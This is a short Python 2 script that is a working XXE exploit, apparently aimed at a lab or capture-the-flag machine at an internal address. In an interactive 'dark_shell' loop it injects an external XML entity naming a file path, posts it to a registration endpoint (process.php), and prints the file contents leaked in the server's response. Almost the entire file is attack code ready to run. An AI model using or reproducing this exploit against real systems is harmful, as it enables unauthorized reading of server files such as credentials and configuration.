#coding:utf-8

import sys
import requests

class Dark:
    def __init__(self, THREADS=30, URL_SELF="http://10.1.1.30/",
                XMLARGS=None):
        '''
            The __init__ function allows you 
            to create the variables and then
            call them in the function __str__
        '''
        self.ARGUMENT = URL_SELF
        self.THREADS  = THREADS
        self.XMLARGS  = XMLARGS

    def __str__(self):
        '''
            So the function __str__ it will attack
            the service in question and recover the values
        '''
        while True:
            send_file_command = raw_input("[dark_shell]> ")

            # I created a prompt to make it easy.
            # And then I created a header for sending the dream.

            self.XMLARGS = '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE email [
            <!ELEMENT email ANY >
            <!ENTITY xxe SYSTEM "file:///%s" >]>

            <root>
            <name></name>
            <tel></tel>
            <email>&xxe;</email>
            <password></password>
            </root>
            ''' %(send_file_command)

            new_requests = requests.Session()
            headers_content = {'Content-Type': 'application/xml'}
            new_requests = new_requests.post(self.ARGUMENT + "process.php", data=self.XMLARGS, headers=headers_content)

            if("Sorry,  is already registered!" != new_requests.text):
                service_value = new_requests.text.replace("Sorry,", "")
                service_value = service_value.replace("is already registered!", "")
                print service_value
            else:
                print "[!] File not found in machine sorry."
                continue


if __name__ == "__main__":
    algorithm = Dark()
    algorithm.__str__()
